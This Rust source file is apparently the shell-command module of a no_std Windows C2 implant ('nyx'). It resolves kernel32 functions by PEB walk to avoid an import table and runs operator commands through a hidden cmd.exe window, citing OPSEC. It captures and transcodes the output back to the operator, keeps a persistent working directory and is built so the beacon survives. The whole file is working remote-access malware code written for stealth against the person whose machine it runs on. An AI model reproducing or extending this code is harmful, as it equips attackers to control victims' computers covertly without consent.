//! Shell command execution via CreateProcessW with redirected stdout/stderr.
//!
//! Resolved through the PEB walk (no IAT). cmd.exe /C args; CREATE_NO_WINDOW
//! suppresses the console. The implant is `#![no_std]`, so it cannot use
//! `std::process::Command` — it shells out the way real position-independent
//! implants do: resolve the kernel32 process/pipe/file functions by djb2 hash,
//! build an anonymous pipe, point the child's stdout+stderr at the write end,
//! spawn `cmd.exe /C <args>`, and drain the read end until EOF.
//!
//! All Win32 functions come from `kernel32.dll` (always loaded in-process, so
//! no LoadLibrary is needed). The full 7-export table is resolved up front; if
//! any single export is missing the call fails fast with `Response::Err` rather
//! than transmuting a null pointer.
//!
//! 另外有两个中文 Windows 实测暴露的问题在这里就地解决:
//! 1. cmd 输出是 GBK(CP936/OEM),返回前在 implant 侧转成 UTF-8(参照 CS)。
//! 2. `cd`/`pwd` 拦截为内建命令,用 Get/SetCurrentDirectoryW 实现持久 CWD
//!    (CreateProcessW 的 lpCurrentDirectory 是 NULL,子进程继承父 CWD)。

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use nyx_implant_core::heap::{vec, String, Vec};
use nyx_implant_core::resolve::export_addr;
use nyx_protocol::Response;

// ---- Win32 constants ----

/// STARTUPINFO.dwFlags bit: use hStdInput/hStdOutput/hStdError instead of the
/// console defaults. Without this, the handles we set below are ignored.
const STARTF_USESTDHANDLES: u32 = 0x100;
/// CREATE_NO_WINDOW: the child runs with no visible console. OPSEC rationale —
/// spawning cmd.exe would otherwise flash a conhost window to the user.
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
/// WaitForSingleObject timeout for reaping the child process. Bounded (NOT
/// INFINITE) so a hung/long-running child (`ping -t`, a stuck binary) cannot
/// block the beacon forever — an INFINITE wait would permanently kill beacon
/// check-ins (P1-7). 30 s covers normal shell commands; on timeout we
/// TerminateProcess so the beacon survives and signals the operator.
const SHELL_TIMEOUT: u32 = 30_000;
/// WaitForSingleObject return value: the timeout elapsed without the handle
/// being signaled (the child did not exit in time).
const WAIT_TIMEOUT: u32 = 0x0000_0102;
/// SetHandleInformation dwMask / dwFlags value: the handle's inherit bit.
const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
/// Upper bound on captured stdout. Prevents a runaway child (`ping -t`,
/// `yes`, a compile loop) from growing the output Vec unbounded and OOMing the
/// implant — a long-lived process that must survive many beacon cycles.
const MAX_OUTPUT: usize = 1 << 20; // 1 MiB
/// MultiByteToWideChar 的 CP_OEMCP:用系统 OEM 代码页解码(中文 Windows 即
/// CP936/GBK,cmd.exe 管道输出的实际编码)。
const CP_OEMCP: u32 = 1;
/// WideCharToMultiByte 的 CP_UTF8:转换成 UTF-8 交给上游渲染。
const CP_UTF8: u32 = 65001;

// ---- Win32 function pointer types (x64 "system" calling convention) ----

type CreateProcessW = unsafe extern "system" fn(
    lp_application_name: *const u16,
    lp_command_line: *mut u16,
    lp_process_attributes: *const SecurityAttributes,
    lp_thread_attributes: *const SecurityAttributes,
    b_inherit_handles: i32,
    dw_creation_flags: u32,
    lp_environment: *mut c_void,
    lp_current_directory: *const u16,
    lp_startup_info: *mut StartupInfoW,
    lp_process_information: *mut ProcessInformation,
) -> i32;

type CreatePipe = unsafe extern "system" fn(
    *mut *mut c_void,
    *mut *mut c_void,
    *const SecurityAttributes,
    u32,
) -> i32;

type ReadFile = unsafe extern "system" fn(
    h_file: *mut c_void,
    lp_buffer: *mut u8,
    n_number_of_bytes_to_read: u32,
    lp_number_of_bytes_read: *mut u32,
    lp_overlapped: *mut c_void,
) -> i32;

type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
type GetExitCodeProcess = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
type SetHandleInformation = unsafe extern "system" fn(*mut c_void, u32, u32) -> i32;

// 输出转码用(OEM/GBK → UTF-16 → UTF-8)
type MultiByteToWideChar = unsafe extern "system" fn(
    code_page: u32,
    dw_flags: u32,
    lp_multi_byte_str: *const u8,
    cb_multi_byte: i32,
    lp_wide_char_str: *mut u16,
    cch_wide_char: i32,
) -> i32;

type WideCharToMultiByte = unsafe extern "system" fn(
    code_page: u32,
    dw_flags: u32,
    lp_wide_char_str: *const u16,
    cch_wide_char: i32,
    lp_multi_byte_str: *mut u8,
    cb_multi_byte: i32,
    lp_default_char: *const u8,
    lp_used_default_char: *mut i32,
) -> i32;

// cd/pwd 内建用(持久 CWD)
type GetCurrentDirectoryW = unsafe extern "system" fn(u32, *mut u16) -> u32;
type SetCurrentDirectoryW = unsafe extern "system" fn(*const u16) -> i32;

// ---- Win32 structs ----

#[repr(C)]
struct SecurityAttributes {
    n_length: u32,
    lp_security_descriptor: *mut c_void,
    b_inherit_handle: i32,
}

#[repr(C)]
struct StartupInfoW {
    cb: u32,
    lp_reserved: *const u16,
    lp_desktop: *const u16,
    lp_title: *const u16,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *mut u8,
    h_std_input: *mut c_void,
    h_std_output: *mut c_void,
    h_std_error: *mut c_void,
}

#[repr(C)]
struct ProcessInformation {
    h_process: *mut c_void,
    h_thread: *mut c_void,
    dw_process_id: u32,
    dw_thread_id: u32,
}

/// Execute `cmd.exe /C <args>` and return combined stdout+stderr as
/// `Response::Output`. Any resolution/spawn failure becomes `Response::Err`.
///
/// 入口先拦截 `pwd`/`cd`/`chdir` 内建命令(持久 CWD,不起 cmd 子进程);
/// 其余命令走原有 `cmd.exe /C` 路径。
///
/// The whole body is `unsafe` — PEB-walk resolution dereferences raw module
/// pointers, and every Win32 call here touches kernel handles.
pub fn run_shell(args: &str) -> Response {
    if let Some(resp) = unsafe { run_shell_builtin(args) } {
        return resp;
    }
    unsafe { run_shell_inner(args) }
}

/// 内建命令拦截(参照 CS beacon 行为)。每条 shell 原来都新起 `cmd.exe /C`,
/// 导致 `cd` 不持久、`pwd` 根本不是 cmd 内建命令直接报错 —— 中文 Windows
/// 实测暴露的问题。这里用 Get/SetCurrentDirectoryW 直接操作 beacon 进程自身
/// 的 CWD;由于 CreateProcessW 的 lpCurrentDirectory 传 NULL,后续 shell 的
/// cmd 子进程会继承这个 CWD,从而实现持久。
///
/// 返回 `Some(Response)` 表示命中内建已处理;`None` 表示不是内建命令,
/// 调用方走原有 cmd 路径。
///
/// # Safety
/// PEB-walk 解析 export 并 transmute 成函数指针调用。
unsafe fn run_shell_builtin(args: &str) -> Option<Response> {
    let trimmed = args.trim();
    // 拆出命令名(cmd 内建命令不区分大小写)
    let (cmd, rest) = match trimmed.find(|c: char| c.is_ascii_whitespace()) {
        Some(i) => (&trimmed[..i], trimmed[i..].trim()),
        None => (trimmed, ""),
    };
    let mut lower: String = String::with_capacity(cmd.len());
    lower.extend(cmd.chars().map(|c| c.to_ascii_lowercase()));
    match lower.as_str() {
        "pwd" => Some(run_shell_get_cwd()),
        "cd" | "chdir" => {
            if rest.is_empty() {
                // 裸 `cd`:cmd 语义是打印当前目录,与 pwd 一致
                Some(run_shell_get_cwd())
            } else {
                // 兼容 `cd /d X`(跨盘符切换);/d 不区分大小写
                let path = rest
                    .strip_prefix("/d")
                    .or_else(|| rest.strip_prefix("/D"))
                    .map(str::trim)
                    .unwrap_or(rest);
                // 剥掉包裹路径的双引号("C:\Program Files\..." 这类含空格路径)
                let path = path
                    .strip_prefix('"')
                    .and_then(|p| p.strip_suffix('"'))
                    .unwrap_or(path);
                Some(run_shell_set_cwd(path))
            }
        }
        _ => None,
    }
}

/// 用 GetCurrentDirectoryW 取 beacon 进程当前目录,转成 UTF-8 返回。
/// 解析/调用失败优雅降级为 Response::Err,不 panic。
///
/// # Safety
/// 同 [`run_shell_builtin`]。
unsafe fn run_shell_get_cwd() -> Response {
    let get_cwd: GetCurrentDirectoryW = match export_addr(b"kernel32.dll", b"GetCurrentDirectoryW")
    {
        Some(a) => core::mem::transmute(a),
        None => return Response::Err(String::from("shell: GetCurrentDirectoryW unresolved")),
    };
    // 两段式:第一次拿长度(返回值含 NUL),再分配缓冲读取
    let len = get_cwd(0, core::ptr::null_mut());
    if len == 0 {
        return Response::Err(String::from("shell: GetCurrentDirectoryW failed"));
    }
    let mut buf: Vec<u16> = vec![0u16; len as usize];
    let written = get_cwd(len, buf.as_mut_ptr());
    if written == 0 {
        return Response::Err(String::from("shell: GetCurrentDirectoryW failed"));
    }
    // 第二次调用的返回值不含 NUL,截断后转 UTF-8
    buf.truncate(written as usize);
    Response::Output(String::from_utf16_lossy(&buf).into_bytes())
}

/// 用 SetCurrentDirectoryW 设置 beacon 进程 CWD(支持 `cd ..`、`cd \` 等
/// 相对/绝对路径,由 Windows 自己解析),成功后回读新 CWD 返回给操作员。
///
/// # Safety
/// 同 [`run_shell_builtin`]。
unsafe fn run_shell_set_cwd(path: &str) -> Response {
    let set_cwd: SetCurrentDirectoryW = match export_addr(b"kernel32.dll", b"SetCurrentDirectoryW")
    {
        Some(a) => core::mem::transmute(a),
        None => return Response::Err(String::from("shell: SetCurrentDirectoryW unresolved")),
    };
    // 操作员输入是 UTF-8,转 UTF-16 + NUL 交给 W API
    let mut wide: Vec<u16> = Vec::with_capacity(path.len() + 1);
    wide.extend(path.encode_utf16());
    wide.push(0);
    if set_cwd(wide.as_ptr()) == 0 {
        return Response::Err(String::from(
            "shell: cd failed (path not found or inaccessible)",
        ));
    }
    // 设置成功后回读规范化后的真实 CWD
    run_shell_get_cwd()
}

unsafe fn run_shell_inner(args: &str) -> Response {
    // ---- resolve all 7 kernel32 exports up front ----
    // If any is missing, fail fast rather than transmute a null address.
    let ShellExports {
        create_process,
        create_pipe,
        read_file,
        wait_for_single,
        get_exit_code: _get_exit_code,
        close_handle,
        set_handle_info,
    } = match run_shell_inner_resolve() {
        Ok(fns) => fns,
        Err(e) => return Response::Err(String::from(e)),
    };

    // ---- build the pipe: read end stays in the parent, write end goes to child ----
    let (child_std_out_read, child_std_out_write) =
        match run_shell_inner_pipe(create_pipe, set_handle_info) {
            Some(pair) => pair,
            None => return Response::Err(String::from("shell: CreatePipe failed")),
        };

    // ---- command line ----
    let mut cmdline: Vec<u16> = run_shell_inner_cmdline(args);

    // ---- startup info + spawn: redirect stdout+stderr to the pipe write end ----
    let pi = match run_shell_inner_spawn(
        create_process,
        close_handle,
        child_std_out_read,
        child_std_out_write,
        cmdline.as_mut_ptr(),
    ) {
        Some(pi) => pi,
        None => return Response::Err(String::from("shell: CreateProcessW failed")),
    };

    // ---- drain stdout+stderr ----
    let (out, capped) = run_shell_inner_drain(read_file, child_std_out_read);

    // ---- reap the child and clean up every handle ----
    let out = run_shell_inner_reap(wait_for_single, &pi, out, capped);
    run_shell_inner_finish(_get_exit_code, close_handle, pi, child_std_out_read, out)
}

/// The 7 kernel32 exports used by [`run_shell_inner`], resolved up front in
/// one pass. Grouped so the resolve helper's signature stays short.
struct ShellExports {
    create_process: CreateProcessW,
    create_pipe: CreatePipe,
    read_file: ReadFile,
    wait_for_single: WaitForSingleObject,
    get_exit_code: GetExitCodeProcess,
    close_handle: CloseHandle,
    set_handle_info: SetHandleInformation,
}

/// Resolve all 7 kernel32 exports used by [`run_shell_inner`], in the order
/// the original function did. Returns the resolved function pointers, or the
/// exact original `shell: <export> unresolved` message on the first miss.
///
/// # Safety
/// Transmutes raw export addresses into function pointers; every one is used
/// on kernel handles below.
unsafe fn run_shell_inner_resolve() -> Result<ShellExports, &'static str> {
    let create_process: CreateProcessW = match export_addr(b"kernel32.dll", b"CreateProcessW") {
        Some(a) => core::mem::transmute(a),
        None => return Err("shell: CreateProcessW unresolved"),
    };
    let create_pipe: CreatePipe = match export_addr(b"kernel32.dll", b"CreatePipe") {
        Some(a) => core::mem::transmute(a),
        None => return Err("shell: CreatePipe unresolved"),
    };
    let read_file: ReadFile = match export_addr(b"kernel32.dll", b"ReadFile") {
        Some(a) => core::mem::transmute(a),
        None => return Err("shell: ReadFile unresolved"),
    };
    let wait_for_single: WaitForSingleObject =
        match export_addr(b"kernel32.dll", b"WaitForSingleObject") {
            Some(a) => core::mem::transmute(a),
            None => return Err("shell: WaitForSingleObject unresolved"),
        };
    let _get_exit_code: GetExitCodeProcess =
        match export_addr(b"kernel32.dll", b"GetExitCodeProcess") {
            Some(a) => core::mem::transmute(a),
            None => return Err("shell: GetExitCodeProcess unresolved"),
        };
    let close_handle: CloseHandle = match export_addr(b"kernel32.dll", b"CloseHandle") {
        Some(a) => core::mem::transmute(a),
        None => return Err("shell: CloseHandle unresolved"),
    };
    let set_handle_info: SetHandleInformation =
        match export_addr(b"kernel32.dll", b"SetHandleInformation") {
            Some(a) => core::mem::transmute(a),
            None => return Err("shell: SetHandleInformation unresolved"),
        };
    Ok(ShellExports {
        create_process,
        create_pipe,
        read_file,
        wait_for_single,
        get_exit_code: _get_exit_code,
        close_handle,
        set_handle_info,
    })
}

/// Build the anonymous pipe: read end stays in the parent, write end goes to
/// the child. Returns `(read, write)` handles, or `None` if CreatePipe failed
/// (nothing opened yet, nothing to clean up).
///
/// # Safety
/// Calls the resolved kernel32 pipe functions on raw handles.
unsafe fn run_shell_inner_pipe(
    create_pipe: CreatePipe,
    set_handle_info: SetHandleInformation,
) -> Option<(*mut c_void, *mut c_void)> {
    // SECURITY_ATTRIBUTES.bInheritHandle = TRUE so the write handle is inherited
    // by the child; the read handle is then explicitly marked NON-inheritable
    // below, so only the child holds a write reference. That is what lets
    // ReadFile hit EOF once the child exits and closes its write end.
    let sa = SecurityAttributes {
        n_length: core::mem::size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: core::ptr::null_mut(),
        b_inherit_handle: 1,
    };
    let mut child_std_out_read: *mut c_void = core::ptr::null_mut();
    let mut child_std_out_write: *mut c_void = core::ptr::null_mut();
    if create_pipe(&mut child_std_out_read, &mut child_std_out_write, &sa, 0) == 0 {
        // CreatePipe failed — nothing opened yet, nothing to clean up.
        return None;
    }
    // Mark the READ end non-inheritable. The write end is still inheritable
    // (from sa), which is what CreateProcessW will duplicate into the child.
    set_handle_info(child_std_out_read, HANDLE_FLAG_INHERIT, 0);
    Some((child_std_out_read, child_std_out_write))
}

/// Build the `cmd.exe /C <args>` command line. CreateProcessW may modify
/// lpCommandLine in place (it re-parses the args), so it must be a WRITABLE
/// buffer; transport.rs's to_utf16 returns an immutable Vec<u16>, so we build
/// our own to hand off a `*mut u16`.
fn run_shell_inner_cmdline(args: &str) -> Vec<u16> {
    let mut cmdline: Vec<u16> = Vec::with_capacity(9 + args.len() + 1);
    // The "cmd.exe /C " prefix is pure ASCII — widen each byte directly.
    cmdline.extend(b"cmd.exe /C ".iter().map(|&b| b as u16));
    // The operator's args may contain non-ASCII (filenames), so widen those
    // through str::encode_utf16 (a core method, available under no_std).
    cmdline.extend(args.encode_utf16());
    cmdline.push(0); // NUL terminator
    cmdline
}

/// Build the STARTUPINFO that redirects the child's stdout+stderr to the pipe
/// write end. STARTF_USESTDHANDLES tells CreateProcessW to use the hStd*
/// handles below instead of the console; without this bit the handles are
/// ignored.
///
/// # Safety
/// `core::mem::zeroed()` on a `#[repr(C)]` struct.
unsafe fn run_shell_inner_startup(child_std_out_write: *mut c_void) -> StartupInfoW {
    let mut si: StartupInfoW = core::mem::zeroed();
    si.cb = core::mem::size_of::<StartupInfoW>() as u32;
    si.dw_flags = STARTF_USESTDHANDLES;
    si.h_std_output = child_std_out_write;
    si.h_std_error = child_std_out_write; // combine stderr into the same stream
    si.h_std_input = core::ptr::null_mut(); // no stdin; cmd /C rarely needs it
    si
}

/// Spawn `cmd.exe /C <args>` with stdout+stderr on the pipe write end. On
/// CreateProcessW failure BOTH pipe ends are closed (the implant is long-lived
/// and a handle leak per failed shell would exhaust the table over thousands
/// of cycles). On success the parent's copy of the write end is closed NOW:
/// the child has its own (inherited) reference, so this does not break it, and
/// it ensures that once the child finishes and closes its write handle there
/// are no remaining writers and ReadFile returns 0 (EOF) — without this,
/// ReadFile would block forever because the parent still holds a write
/// reference to the pipe.
///
/// # Safety
/// Calls the resolved kernel32 process functions on raw handles.
unsafe fn run_shell_inner_spawn(
    create_process: CreateProcessW,
    close_handle: CloseHandle,
    child_std_out_read: *mut c_void,
    child_std_out_write: *mut c_void,
    cmdline: *mut u16,
) -> Option<ProcessInformation> {
    let mut si = run_shell_inner_startup(child_std_out_write);
    let mut pi: ProcessInformation = core::mem::zeroed();
    // lpApplicationName = NULL (cmd.exe resolved via lpCommandLine + PATH).
    // bInheritHandles = TRUE so the write end of the pipe is inherited.
    // dwCreationFlags includes CREATE_NO_WINDOW — no conhost flash (OPSEC).
    let ok = create_process(
        core::ptr::null(),
        cmdline,
        core::ptr::null(),
        core::ptr::null(),
        1,
        CREATE_NO_WINDOW,
        core::ptr::null_mut(),
        core::ptr::null(),
        &mut si,
        &mut pi,
    );
    if ok == 0 {
        close_handle(child_std_out_read);
        close_handle(child_std_out_write);
        return None;
    }
    close_handle(child_std_out_write);
    Some(pi)
}

/// Drain the child's stdout+stderr until EOF or MAX_OUTPUT. Returns the
/// captured bytes plus `capped` (true once MAX_OUTPUT is reached).
///
/// # Safety
/// Calls the resolved ReadFile on the pipe read handle.
unsafe fn run_shell_inner_drain(
    read_file: ReadFile,
    child_std_out_read: *mut c_void,
) -> (Vec<u8>, bool) {
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 4096];
    let mut capped = false; // true once MAX_OUTPUT is reached
    loop {
        if out.len() >= MAX_OUTPUT {
            // Hard cap reached — stop appending. We flag `capped` so the wait
            // below TERMINATES the child instead of blocking forever: a child
            // still producing into a full pipe (~64 KiB kernel buffer) would
            // block on its next WriteFile, while WaitForSingleObject(INFINITE)
            // blocks on the child exiting → classic deadlock. Killing the
            // child unblocks both sides.
            capped = true;
            break;
        }
        let mut read: u32 = 0;
        // ReadFile returns 0 on error OR on EOF. We distinguish by checking
        // bytes_read: >0 is data, ==0 (after a "successful" 0-length read or
        // an error read) means EOF/pipe-closed — break.
        let ok = read_file(
            child_std_out_read,
            buf.as_mut_ptr(),
            buf.len() as u32,
            &mut read,
            core::ptr::null_mut(),
        );
        if read == 0 {
            break;
        }
        // Defense-in-depth: never append more than what was read, and never
        // overshoot the cap on the final chunk.
        let take = (read as usize).min(MAX_OUTPUT - out.len());
        out.extend_from_slice(&buf[..take]);
        if ok == 0 {
            // ReadFile reported an error after yielding some bytes — we have
            // what we got; stop.
            break;
        }
    }
    (out, capped)
}

/// Reap the child: if the drain hit MAX_OUTPUT the child may still be alive
/// and blocked writing into the (full) pipe, so terminate it first; then wait
/// up to SHELL_TIMEOUT and kill a still-hung child, appending the forced-
/// termination marker to the output.
///
/// # Safety
/// Calls the resolved kernel32 exports on the raw process handle.
unsafe fn run_shell_inner_reap(
    wait_for_single: WaitForSingleObject,
    pi: &ProcessInformation,
    mut out: Vec<u8>,
    capped: bool,
) -> Vec<u8> {
    // If we stopped reading because MAX_OUTPUT was hit, the child may still be
    // alive and blocked writing into the (full) pipe. WaitForSingleObject(INFINITE)
    // would then deadlock (parent waits for child exit, child waits for parent to
    // drain). Terminate the child first so the wait always completes.
    if capped {
        type TerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
        if let Some(addr) = export_addr(b"kernel32.dll", b"TerminateProcess") {
            let term: TerminateProcess = core::mem::transmute(addr);
            let _ = term(pi.h_process, 1);
        }
    }
    // Bounded reap: wait up to SHELL_TIMEOUT for the child to exit. If the
    // `capped` branch above already TerminateProcess'd it, this returns at
    // once (the handle is signaled on exit). On WAIT_TIMEOUT the child is
    // still alive (hung/long-running) — kill it so the beacon survives and
    // signal the forced termination to the operator.
    let wait_result = wait_for_single(pi.h_process, SHELL_TIMEOUT);
    if wait_result == WAIT_TIMEOUT {
        type TerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
        if let Some(addr) = export_addr(b"kernel32.dll", b"TerminateProcess") {
            let term: TerminateProcess = core::mem::transmute(addr);
            let _ = term(pi.h_process, 1);
        }
        out.extend_from_slice(b"\n<nyx: shell command timed out and was killed>\n");
    }
    out
}

/// 中文 Windows 实测:cmd.exe 管道输出是 GBK(CP936/OEM 代码页)原始字节,
/// 上游当 UTF-8 渲染全是 `` 乱码。参照 Cobalt Strike 的做法在 implant 侧
/// 转 UTF-8:先用 `from_utf8` 探测 —— 已是合法 UTF-8(纯 ASCII 也算,也兼容
/// 自己输出 UTF-8 的工具)就零开销透传;否则走
/// MultiByteToWideChar(CP_OEMCP) + WideCharToMultiByte(CP_UTF8) 两段转换。
/// export 解析失败或任何一次转换失败都优雅降级返回原始字节,绝不 panic
/// 崩 beacon(no_std 下用 alloc Vec,先调一次拿长度再分配)。
///
/// # Safety
/// PEB-walk 解析 export 并 transmute 成函数指针,对原始字节缓冲调用。
unsafe fn run_shell_inner_transcode(out: Vec<u8>) -> Vec<u8> {
    // 空输出或已是合法 UTF-8(含纯 ASCII):直接透传
    if out.is_empty() || core::str::from_utf8(&out).is_ok() {
        return out;
    }
    let mb_to_wide: MultiByteToWideChar = match export_addr(b"kernel32.dll", b"MultiByteToWideChar")
    {
        Some(a) => core::mem::transmute(a),
        None => return out, // 解析失败:降级返回原始字节
    };
    let wide_to_mb: WideCharToMultiByte = match export_addr(b"kernel32.dll", b"WideCharToMultiByte")
    {
        Some(a) => core::mem::transmute(a),
        None => return out,
    };
    // 第一段:OEM/GBK → UTF-16。先拿宽字符长度,再分配转换。
    let wlen = mb_to_wide(
        CP_OEMCP,
        0,
        out.as_ptr(),
        out.len() as i32,
        core::ptr::null_mut(),
        0,
    );
    if wlen <= 0 {
        return out;
    }
    let mut wide: Vec<u16> = vec![0u16; wlen as usize];
    let written_w = mb_to_wide(
        CP_OEMCP,
        0,
        out.as_ptr(),
        out.len() as i32,
        wide.as_mut_ptr(),
        wlen,
    );
    if written_w <= 0 {
        return out;
    }
    wide.truncate(written_w as usize);
    // 第二段:UTF-16 → UTF-8。同样先拿字节长度再分配。
    // CP_UTF8 下 dwFlags/lpDefaultChar/lpUsedDefaultChar 必须为 0/NULL。
    let blen = wide_to_mb(
        CP_UTF8,
        0,
        wide.as_ptr(),
        written_w,
        core::ptr::null_mut(),
        0,
        core::ptr::null(),
        core::ptr::null_mut(),
    );
    if blen <= 0 {
        return out;
    }
    let mut utf8: Vec<u8> = vec![0u8; blen as usize];
    let written_b = wide_to_mb(
        CP_UTF8,
        0,
        wide.as_ptr(),
        written_w,
        utf8.as_mut_ptr(),
        blen,
        core::ptr::null(),
        core::ptr::null_mut(),
    );
    if written_b <= 0 {
        return out;
    }
    utf8.truncate(written_b as usize);
    utf8
}

/// Harvest the child's exit code, close every remaining handle (process +
/// thread + pipe read — CreateProcessW opened both process handles and the
/// read end is still ours), transcode OEM/GBK output to UTF-8, and wrap the
/// captured output as `Response::Output`.
///
/// # Safety
/// Calls the resolved kernel32 exports on the raw process/pipe handles.
unsafe fn run_shell_inner_finish(
    _get_exit_code: GetExitCodeProcess,
    close_handle: CloseHandle,
    pi: ProcessInformation,
    child_std_out_read: *mut c_void,
    out: Vec<u8>,
) -> Response {
    // Best-effort exit-code harvest (unused today — Response has no exit-code
    // variant), but it documents the resolved GetExitCodeProcess export is live.
    let mut exit_code: u32 = 0;
    let _ = _get_exit_code(pi.h_process, &mut exit_code);

    // Close process + thread handles (CreateProcessW opened both) and the read
    // end of the pipe. All three must be closed to avoid leaking handles.
    close_handle(pi.h_process);
    close_handle(pi.h_thread);
    close_handle(child_std_out_read);

    // GBK/OEM → UTF-8 转码后包装返回(见 run_shell_inner_transcode 注释)
    Response::Output(run_shell_inner_transcode(out))
}
